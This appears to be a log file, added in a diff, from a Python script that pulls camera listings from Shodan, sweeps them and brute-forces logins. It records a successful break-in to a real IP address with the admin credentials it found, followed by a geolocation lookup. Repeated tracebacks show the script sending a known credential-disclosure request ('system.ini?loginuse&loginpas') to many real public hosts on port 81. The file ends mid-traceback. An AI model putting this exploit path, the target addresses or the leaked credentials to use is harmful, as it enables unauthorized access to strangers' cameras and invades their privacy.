@@ -1,0 +1,1539 @@
+INFO:root:2023-04-10 16:03:01.045925: Program started.
+
+ERROR:root:[2023-04-10 16:03:02.781945]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 15, in <module>
+    current_date_str = response.json()['currentDateTime']
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\models.py", line 897, in json
+    return complexjson.loads(self.text, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\__init__.py", line 357, in loads
+    return _default_decoder.decode(s)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+INFO:root:2023-04-10 16:03:08.318856: Program started.
+
+ERROR:root:[2023-04-10 16:03:30.126076]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 15, in <module>
+    current_date_str = response.json()['currentDateTime']
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\models.py", line 897, in json
+    return complexjson.loads(self.text, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\__init__.py", line 357, in loads
+    return _default_decoder.decode(s)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+INFO:root:2023-04-10 16:04:38.132128: Program started.
+
+ERROR:root:[2023-04-10 16:04:38.502647]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 15, in <module>
+    current_date_str = response.json()['currentDateTime']
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\models.py", line 897, in json
+    return complexjson.loads(self.text, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\__init__.py", line 357, in loads
+    return _default_decoder.decode(s)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\json\decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+
+INFO:root:2023-04-10 16:06:32.168440: Program started.
+
+ERROR:root:[2023-04-10 16:06:32.562930]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 22, in <module>
+    if current_date >= target_date:
+TypeError: '>=' not supported between instances of 'str' and 'datetime.datetime'
+
+INFO:root:2023-04-10 16:06:51.298459: Program started.
+
+INFO:root:2023-04-10 16:07:02.281783: Program started.
+
+INFO:root:2023-04-10 16:07:13.233985: Program started.
+
+INFO:root:[2023-04-10 16:07:13.917217]: Modules imported successfully.
+
+INFO:root:[2023-04-10 16:07:14.044921]: Search operation started without arguments.
+
+INFO:root:[2023-04-10 16:07:23.115680]: Received camera data from Shodan.
+
+INFO:root:[2023-04-10 16:07:23.115680]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-10 16:07:40.526179]: KeyboardInterrupt.
+
+INFO:root:[2023-04-10 16:07:40.528185]: Bruteforce started.
+
+INFO:root:[2023-04-10 16:08:48.419031]: Accessed: 190.191.190.188 ('admin', '123789')
+
+INFO:geocoder.base:Requested http://ipinfo.io/190.191.190.188/json
+INFO:root:[2023-04-10 16:08:48.629324]: Shutdown
+
+INFO:root:2023-04-25 21:23:13.719068: Program started.
+
+INFO:root:2023-04-25 21:23:37.669791: Program started.
+
+INFO:root:[2023-04-25 21:23:38.332066]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:23:38.612557]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:23:41.194224]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:23:41.194224]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:23:53.258931]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='39.104.17.48', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='39.104.17.48', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:23:56.382911]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 171, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x00000087EC03ECA0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='47.91.110.147', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EC03ECA0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 516, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='47.91.110.147', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EC03ECA0>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+ERROR:root:[2023-04-25 21:24:00.728796]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 171, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x00000087EB5D0850>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='47.91.106.231', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EB5D0850>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 516, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='47.91.106.231', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EB5D0850>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+ERROR:root:[2023-04-25 21:24:32.464736]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='8.134.222.189', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='8.134.222.189', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:24:45.432843]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='149.129.178.222', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='149.129.178.222', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:24:55.770237]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='47.104.90.222', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='47.104.90.222', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:24:59.879631]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+ConnectionRefusedError: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 171, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x00000087EC2E4460>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
